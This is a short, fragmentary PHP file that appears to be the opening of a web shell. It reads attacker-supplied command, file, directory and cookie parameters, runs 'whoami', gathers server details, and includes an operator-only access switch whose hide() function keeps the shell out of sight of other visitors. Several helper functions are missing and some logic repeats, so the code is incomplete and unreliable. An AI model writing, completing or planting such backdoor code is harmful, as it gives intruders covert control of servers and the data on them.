<?php
$version = "1.3 final";
$self = $_SERVER['PHP_SELF'];
$soft = $_SERVER["SERVER_SOFTWARE"];
$servinf = split("[:]", getenv('HTTP_HOST'));
$servip = $servinf[0];
$servport = $servinf[1];
$uname = php_uname();
$curuser = @exec('whoami');
$cmd = $_GET['cmd'];
$act = $_GET['act'];
$cmd = $_GET['cmd'];
$cookie = $_GET['cookie'];
$f = $_GET['f'];
$curdir = cleandir(getcwd());
if(!$dir){$dir = $_GET['dir'];}
elseif($dir && $_SESSION['dir']){$dir = $_SESSION['dir'];}
elseif($dir && $_SESSION['dir']){$dir = $curdir;}
if($dir && $dir != "nullz"){$dir = cleandir($dir);}
$contents = $_POST['contents'];
$gf = $_POST['gf'];
$img = $_GET['img'];
session_start();
@set_time_limit(5);

switch($auth){ // Authentication switcher
  case 0: break;
  case 1: if(md5($_SERVER['HTTP_USER_AGENT']) != $uakey){hide();} break;
  case 2: if(!in_array($_SERVER['REMOTE_ADDR'],$IP)){hide();} break;
  case 3: if(!$_SERVER["PHP_AUTH_USER"]){userauth();} break;
}

exit;
?>